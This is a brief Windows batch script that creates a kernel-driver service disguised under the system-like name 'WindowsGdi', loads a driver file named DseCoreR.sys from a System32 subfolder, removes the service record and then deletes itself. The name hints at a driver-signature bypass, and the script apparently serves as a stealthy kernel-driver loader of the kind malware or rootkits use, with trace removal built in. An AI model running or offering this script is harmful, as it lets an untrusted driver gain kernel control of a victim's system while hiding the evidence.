@echo off
cd %~dp0
sc create WindowsGdi binpath=C:\Windows\System32\dsc\DseCoreR.sys type=kernel
sc start WindowsGdi
sc delete WindowsGdi
del "%~f0"